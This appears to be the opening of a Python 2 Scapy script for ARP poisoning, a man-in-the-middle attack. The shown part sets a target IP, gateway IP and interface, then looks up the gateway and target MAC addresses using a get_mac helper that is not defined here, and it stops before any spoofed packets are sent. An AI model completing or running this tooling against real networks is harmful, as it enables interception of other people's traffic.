from scapy.all import *
import os
import sys
import threading
import signal

interface       = "eth0"
target_ip       = "192.168.1.3"
gateway_ip      = "192.168.1.1"
packet_count    = 1000

# set our output
conf.iface = interface

# turn off output
conf.verb = 0

print "[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
	print "[!!!] Failed to get gateway MAC. Exiting."
	sys.exit(0)
else:
	print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

